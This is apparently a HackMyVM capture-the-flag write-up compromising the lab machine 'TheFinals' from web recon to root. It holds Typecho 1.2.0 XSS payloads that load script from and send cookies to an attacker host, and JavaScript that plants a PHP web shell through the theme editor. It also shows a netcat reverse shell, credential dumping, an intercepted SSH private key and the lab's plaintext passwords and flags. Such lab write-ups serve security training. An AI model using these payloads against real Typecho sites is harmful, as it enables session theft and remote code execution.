# TheFinals

## Recon

::: details nmap_scan.log
```log
Open 10.0.2.51:22
Open 10.0.2.51:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.51

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.9 (protocol 2.0)
| ssh-hostkey: 
|   256 42:a7:04:bb:da:b5:8e:71:7a:89:ff:a4:60:cd:4d:29 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBenX3LQjufn5f3eJ80/MTmboLqzlI5i4FG3rk1hC5WjlmaaS94ItA1ZlZKe8N3hjzjF1ofxIe3k9ny3t9VLuYU=
|   256 37:32:71:ca:3f:11:41:b4:d7:90:1e:c9:7f:e8:bc:20 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM5alDaVxse0LPuxH6UkplS0q1kEeNj3qLD5Oxa5t3XK
80/tcp open  http    syn-ack Apache httpd 2.4.62 ((Unix))
|_http-title: THE FINALS
|_http-server-header: Apache/2.4.62 (Unix)
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/thefinals/writeup.png)

No subdomains found
```bash
└─$ domain='thefinals.hmv'; ffuf -u "http://$domain/" -H "Host: FUZZ.$domain" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt  -mc all -fw 1,1096
```

```bash
└─$ feroxbuster -u http://thefinals.hmv/ -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -D -C 404,400,414,500 --dont-scan css,png,jpeg,jpg,gif -n -x .php,.html,.txt -S 276
200      GET        6l     1215w    93111c http://thefinals.hmv/js/jquery-1.10.2.min.js
200      GET      219l      574w     8047c http://thefinals.hmv/js/jquery.lightbox.js
200      GET     1951l     5129w    55258c http://thefinals.hmv/js/bootstrap.js
301      GET        9l       28w      311c http://thefinals.hmv/blog => http://thefinals.hmv/blog/
200      GET       36l      130w     1118c http://thefinals.hmv/js/tabs.js
200      GET        1l      191w     7068c http://thefinals.hmv/js/jquery-migrate-1.2.1.min.js
200      GET        4l      155w     9707c http://thefinals.hmv/js/modernizr.js
200      GET      122l      290w     5097c http://thefinals.hmv/js/templatemo_custom.js
200      GET      366l     1423w    15280c http://thefinals.hmv/
301      GET        9l       28w      312c http://thefinals.hmv/fonts => http://thefinals.hmv/fonts/
301      GET        9l       28w      313c http://thefinals.hmv/images => http://thefinals.hmv/images/
200      GET      366l     1423w    15280c http://thefinals.hmv/index.html
301      GET        9l       28w      309c http://thefinals.hmv/js => http://thefinals.hmv/js/
301      GET        9l       28w      318c http://thefinals.hmv/screenshots => http://thefinals.hmv/screenshots/
```

`/screenshots` contains few images, but identical to each other.

![writeup-1.png](/assets/pentest/hackmyvm/thefinals/writeup-1.png)

## Typecho 1.2.0

Blog is powered by `Typecho 1.2.0`

![writeup-2.png](/assets/pentest/hackmyvm/thefinals/writeup-2.png)

#### DOM-based-XSS Vulnerability

The blog mentions that staff will check suggestions regularly, XSS?

![writeup-3.png](/assets/pentest/hackmyvm/thefinals/writeup-3.png)

[Typecho <= 1.2.0 Post Editor with DOM-based-XSS Vulnerability #1536](https://github.com/typecho/typecho/issues/1536)

Submit the payload

![writeup-4.png](/assets/pentest/hackmyvm/thefinals/writeup-4.png)

In screenshots we can see what admin sees, but nothing.

![writeup-5.png](/assets/pentest/hackmyvm/thefinals/writeup-5.png)

POC doesn't work

#### XSS

There are 3 vulnerabilities reported for this version

![writeup-6.png](/assets/pentest/hackmyvm/thefinals/writeup-6.png)

[Typecho <= 1.2.0 Comment Manager with Refleted-XSS Vulnerability #1539](https://github.com/typecho/typecho/issues/1539)

I was going to test all fields for XSS but username, email and url are not valid with payload alone

![writeup-7.png](/assets/pentest/hackmyvm/thefinals/writeup-7.png)

The injection point seems to be URL field, but it's awfully picky. Spaces are not allowed, but `/` trick can be used. Following payload didn't work.
```html
http://x.com/"></a><img/src=x/onerror="this.src='http://10.0.2.15/c?'+document.cookie">
```

Script tag worked
```html
http://x.com/"></a><script/src="http://10.0.2.15/t.js"></script>
```

The bot visits page every minute or so, but cookies don't work. It still redirects us to login page.
```js
└─$ nano t.js
fetch('http://10.0.2.15/?' + document.cookie);
---
10.0.2.51 - - [10/Sep/2025 05:16:22] "GET /?7d07d00c3730d08dbac222ccaf73fd49__typecho_uid=1;%207d07d00c3730d08dbac222ccaf73fd49__typecho_authCode=%24T%242xu0f2wxW42386f21bb7c45a36084183ace1ea3aa;%20PHPSESSID=02d0d6c687c9d07c888c0f005570d0bb HTTP/1.1" 200 -
```

#### XSS To RCE

Anyways only XSS is not enough, after some scavenging I found a blog: [Typecho 1.2 - 1.2.1-rc front-end comments store xss to rce vulnerability reproduction-analysis-fix](https://blog.mo60.cn/index.php/archives/Typecho-1-2-xss2rce.html)

*However, Typecho backend operations all have **Referer verification**. If the Referer is not from `domain/admin/theme-editor.php`, the editing will fail. Therefore, it is not possible to use JS to directly send a package to edit the template because setting the Referer header will fail to send*

```js
(function() {
    let saved = false;
    
    function getEditorUrl() {
        const target = 'theme-editor.php?theme=default&file=404.php';
        const path = location.pathname;
        return path.includes('manage-comments.php') 
            ? path.replace('manage-comments.php', target)
            : '/admin/' + target;
    }
    
    function createHiddenIframe(src, onLoad) {
        const iframe = document.createElement('iframe');
        Object.assign(iframe, {
            src,
            onload: onLoad,
            style: 'position:absolute;left:-9999px;width:0;height:0;border:none'
        });
        return iframe;
    }
    
    async function modifyTheme() {
        if (saved) return;
        
        try {
            const iframe = document.getElementById('theme-frame');
            const doc = iframe.contentDocument || iframe.contentWindow?.document;
            
            if (!doc) throw new Error('Cannot access iframe');
            
            const content = doc.getElementById('content');
            const saveBtn = doc.getElementsByTagName('button')[1];
            
            if (content && saveBtn) {
                content.value = '<?php phpinfo(); ?>\n' + content.value;
                saveBtn.click();
                saved = true;
            }
        } catch (e) {
            console.error('Theme modification failed:', e);
        }
    }
    
    const iframe = createHiddenIframe(getEditorUrl(), modifyTheme);
    iframe.id = 'theme-frame';
    document.body.appendChild(iframe);
})();
```

After some time it get's edited and we get RCE.

![writeup-8.png](/assets/pentest/hackmyvm/thefinals/writeup-8.png)

## Reverse Shell

Update: `content.value = '<?php system($_REQUEST[0]); ?>\n' + content.value;`

```bash
└─$ curl 'http://thefinals.hmv/blog/usr/themes/default/404.php' --data-urlencode '0=busybox nc 10.0.2.15 4444 -e /bin/sh'
---
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.51] 39217
> id
uid=102(apache) gid=103(apache) groups=82(www-data),103(apache),103(apache)
```

::: info Note
No bash, so I couldn't upgrade TTY. Commands are prefixed with `>` for writeup.
:::

```bash
> pwd
/var/www/html/blog

> cat config.inc.php
...
// config db
$db = new \Typecho\Db('Pdo_Mysql', 'typecho_');
$db->addServer(array (
  'host' => 'localhost',
  'port' => 3306,
  'user' => 'typecho_u',
  'password' => 'QLTkbviW71CSRZtGWIQdB6s',
  'charset' => 'utf8mb4',
  'database' => 'typecho_db',
  'engine' => 'InnoDB',
), \Typecho\Db::READ | \Typecho\Db::WRITE);
\Typecho\Db::set($db);
```

### MySQL

Find PHP binary
```bash
> find / -type f -executable -name php* 2>/dev/null
/usr/bin/php84
```

Get databases
```bash
> php84 -r '$p=new PDO("mysql:host=localhost","typecho_u","QLTkbviW71CSRZtGWIQdB6s");foreach($p->query("SHOW DATABASES")as$r)echo$r["Database"]."\n";'
information_schema
test
typecho_db
```

Get tables
```bash
php84 -r '$p=new PDO("mysql:host=localhost;dbname=typecho_db","typecho_u","QLTkbviW71CSRZtGWIQdB6s");foreach($p->query("SHOW TABLES")as$r)echo$r[0]."\n";'
typecho_comments
typecho_contents
typecho_fields
typecho_metas
typecho_options
typecho_relationships
typecho_users
```

Get users
```bash
php84 -r '$p=new PDO("mysql:host=localhost;dbname=typecho_db","typecho_u","QLTkbviW71CSRZtGWIQdB6s");foreach($p->query("SELECT * FROM typecho_users")as$r)print_r($r)."\n";'
Array
(
    [uid] => 1
    [0] => 1
    [name] => staff
    [1] => staff
    [password] => $P$B/qMMS9FETOrEZ38X0YDY5gKJOyiwQ1
    [2] => $P$B/qMMS9FETOrEZ38X0YDY5gKJOyiwQ1
    [mail] => staff@thefinals.hmv
    [3] => staff@thefinals.hmv
    [url] => http://thefinals.hmv/blog
    [4] => http://thefinals.hmv/blog
    [screenName] => staff
    [5] => staff
    [created] => 1743647281
    [6] => 1743647281
    [activated] => 1757460185
    [7] => 1757460185
    [logged] => 1757460064
    [8] => 1757460064
    [group] => administrator
    [9] => administrator
    [authCode] => 3bcb43205622030713243ceec0bfc544
    [10] => 3bcb43205622030713243ceec0bfc544
)
```

Nothing, let's leave cracking as last resort.

:dies: `mysql` binary existed, without `2>&1` I thought it didn't exist.
```bash
> mysql -h 2>&1
mysql: Deprecated program name. It will be removed in a future release, use '/usr/bin/mariadb' instead
```

## Lateral Movement

```bash
> grep sh$ /etc/passwd
root:x:0:0:root:/root:/bin/sh
june:x:1001:100::/home/june:/bin/ash
scotty:x:1002:100::/home/scotty:/bin/ash
staff:x:1000:100::/home/staff:/bin/ash
```

We can read `june` user files, but can't create files. No SSH  yet.
```bash
find /home -exec ls -lah {} \;
total 20K
drwxr-xr-x    5 root     root        4.0K Apr  3 13:21 .
drwxr-xr-x   22 root     root        4.0K Apr  3 11:48 ..
drwxr-sr-x    2 june     users       4.0K Apr  3 17:00 june
drwx------    4 scotty   users       4.0K Apr 23 17:28 scotty
drwx------    4 staff    users       4.0K Apr  3 13:36 staff

total 16K
drwxr-sr-x    2 june     users       4.0K Apr  3 17:00 .
drwxr-xr-x    5 root     root        4.0K Apr  3 13:21 ..
lrwxrwxrwx    1 root     users          9 Apr  3 12:24 .ash_history -> /dev/null
-rw-r--r--    1 june     users        183 Apr 15 08:28 message.txt
-rw-r--r--    1 june     users       3.3K Apr  3 12:29 user.flag
-rw-r--r--    1 june     users        183 Apr 15 08:28 /home/june/message.txt
-rw-r--r--    1 june     users       3.3K Apr  3 12:29 /home/june/user.flag
lrwxrwxrwx    1 root     users          9 Apr  3 12:24 /home/june/.ash_history -> /dev/null
> mkdir /home/june/.ssh 2>&1
mkdir: can't create directory '/home/june/.ssh': Permission denied
> cat /home/june/message.txt
Contestants, gear up and get ready! Who's got the KEY? Who's got the the guts?
                                                              --- This BROADCAST has been hacked by CNS
```

```bash
> cat /etc/group | grep -E 'june|scotty|staff'
users:x:100:games,june,scotty,staff
staff:x:1000:staff
> find / -type f -group users -exec ls -lh {} \; 2>/dev/null | grep -vE '/(proc|html)/'
-rw-r--r--    1 june     users        183 Apr 15 08:28 /home/june/message.txt
-rw-r--r--    1 june     users       3.3K Apr  3 12:29 /home/june/user.flag
-rw-r--r--    1 scotty   users          0 Apr  3 13:33 /var/log/scotty-main.err
-rw-r--r--    1 scotty   users      72.2K Sep 10 07:16 /var/log/scotty-main.log
> cat /var/log/scotty-main.log | sort | uniq -c
   1991 Broadcast to eth0 10.0.2.51:1337
    217 Broadcast to eth0 192.168.11.255:1337

> ps aux | grep scotty
 2582 scotty    0:01 /usr/bin/python3 /home/scotty/cns_boardcast/main.py
28275 apache    0:00 grep scotty
```

There's some kind of message broadcasted, we should intercept.
```bash
> nc -ulvnp 1337 # Listen on UDP
LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBMXduMDk0cGhPcXNmYm8rbzNDQllpTjN4QTE2eW1LU2JYMlVZMzJ4L0FFd0FBQUpnRGMvWVVBM1AyCkZBQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQTF3bjA5NHBoT3FzZmJvK28zQ0JZaU4zeEExNnltS1NiWDJVWTMyeC9BRXcKQUFBRUN2N2tmZW9YT1FDaTVDUklXZEhpRFQ1dXBLeVkzdlF4QWxLbXhFUXpSWkxEWENmVDNpbUU2cXg5dWo2amNJRmlJMwpmRURYcktZcEp0ZlpSamZiSDhBVEFBQUFFbkp2YjNSQWRHaGxabWx1WVd4ekxtaHRkZ0VDQXc9PQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K
```

```bash
└─$ base64 -d blob | tee id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACA1wn094phOqsfbo+o3CBYiN3xA16ymKSbX2UY32x/AEwAAAJgDc/YUA3P2
FAAAAAtzc2gtZWQyNTUxOQAAACA1wn094phOqsfbo+o3CBYiN3xA16ymKSbX2UY32x/AEw
AAAECv7kfeoXOQCi5CRIWdHiDT5upKyY3vQxAlKmxEQzRZLDXCfT3imE6qx9uj6jcIFiI3
fEDXrKYpJtfZRjfbH8ATAAAAEnJvb3RAdGhlZmluYWxzLmhtdgECAw==
-----END OPENSSH PRIVATE KEY-----

└─$ file id_rsa
id_rsa: OpenSSH private key

└─$ chmod 600 id_rsa
└─$ ssh-keygen -lf id_rsa
256 SHA256:II2MrYeD9pCzsK6bsxdLZyPKN4KmyvrNUZ6JLuwX0sM root@thefinals.hmv (ED25519)
```

## SSH

```bash
└─$ ssh -i id_rsa scotty@thefinals.hmv
Warning: Permanently added 'thefinals.hmv' (ED25519) to the list of known hosts.

thefinals:~$ id
uid=1002(scotty) gid=100(users) groups=100(users),100(users)
```

### User.txt

```bash
thefinals:~$ grep flag ../june/user.flag
flag{4b5d61daf3e2e5ba57019f617012ad0919c2a6c29e11912aeadef2820be8f298}
```

## Privilege Escalation (root)

```bash
thefinals:~$ sudo -l
Matching Defaults entries for scotty on thefinals:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for scotty:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User scotty may run the following commands on thefinals:
    (ALL) NOPASSWD: /sbin/secret
```

File doesn't have any help menu, but requires `/dev/pts/99`
```bash
thefinals:~$ sudo /sbin/secret --help
/sbin/secret: line 2: can't create /dev/pts/99: Permission denied
```

There's only 1 TTY session, us.
```bash
thefinals:~$ ls /dev/pts/ -lah
total 0
drwxr-xr-x    2 root     root           0 Sep 10 04:28 .
drwxr-xr-x   14 root     root        2.8K Sep 10 04:28 ..
crw--w----    1 scotty   tty       136,   0 Sep 10 08:01 0
c---------    1 root     root        5,   2 Sep 10 04:28 ptmx
```

```bash
thefinals:~$ python3 -c 'import pty;pty.spawn("/bin/ash")' &
thefinals:~$ ls /dev/pts/ -lAh
total 0
crw--w----    1 scotty   tty       136,   0 Sep 10 08:02 0
crw--w----    1 scotty   tty       136,   1 Sep 10 08:02 1
c---------    1 root     root        5,   2 Sep 10 04:28 ptmx
```

```bash
thefinals:~$ for i in $(seq 1 98); do python3 -c 'import pty;pty.spawn("/bin/ash")' & done
thefinals:~$ ls /dev/pts/99
ls: /dev/pts/99: No such file or directory

thefinals:~$ python3 -c 'import pty;pty.spawn("/bin/ash")'
~ $ sudo /sbin/secret
root:p8RuoQGTtlKLAjuF1Tpy5wX
```

> **Creds** (MySQL): `root:p8RuoQGTtlKLAjuF1Tpy5wX`

No luck with `su`, but password looks similar to `mysql` password.

```bash
thefinals:~$ mysql -u'root' -p'p8RuoQGTtlKLAjuF1Tpy5wX' -e 'SHOW DATABASES;'
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| secret             |
| sys                |
| test               |
| typecho_db         |
+--------------------+
thefinals:~$ mysql -u'root' -p'p8RuoQGTtlKLAjuF1Tpy5wX' secret -e 'SHOW TABLES;'
+------------------+
| Tables_in_secret |
+------------------+
| user             |
+------------------+
thefinals:~$ mysql -u'root' -p'p8RuoQGTtlKLAjuF1Tpy5wX' secret -e 'SELECT * FROM user;'
+----+----------+-------------------------+
| id | username | password                |
+----+----------+-------------------------+
|  1 | root     | BvIpFDyB4kNbkyqJGwMzLcK |
+----+----------+-------------------------+
```

```bash
thefinals:~$ su - root
Password: BvIpFDyB4kNbkyqJGwMzLcK
thefinals:~# id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

> **Creds**: `root:BvIpFDyB4kNbkyqJGwMzLcK`

### Root.txt

```bash
thefinals:~# grep flag /root/root.flag
flag{8c5daa407626d218e962041dd8fd8f37913e56e32a6f06725da403175be0b9ff}
```

## P.S.

```bash
thefinals:~# cat /root/note.txt
ssh://root@thefinals.hmv:BvIpFDyB4kNbkyqJGwMzLcK
ssh://staff@thefinals.hmv:qDCsBTj30cQyityMh3Rnyys
ssh://june@thefinals.hmv:aYTmcORsUrmwaKa7C2DBLCh
ssh://scotty@thefinals.hmv:uuUoqAETern4v5tW2iMFs47

mariadb://root@localhost:p8RuoQGTtlKLAjuF1Tpy5wX

mariadb://typecho_u@typecho_db@localhost:QLTkbviW71CSRZtGWIQdB6s

typecho://staff@thefinals.hmv:n3nPbqEOhs6eTcchyqXTXWi
typecho://june@thefinals.hmv:DihPQiQqNO75vv8zNBzLwUm

flag{4b5d61daf3e2e5ba57019f617012ad0919c2a6c29e11912aeadef2820be8f298}
canyoureachthefinals -> sha256

flag{8c5daa407626d218e962041dd8fd8f37913e56e32a6f06725da403175be0b9ff}
youfinallyreachedthefinals -> sha256

THE FINALS is a great FPS game. A lot of inspiration comes from games. Try it on http://reachthefinals.com/
```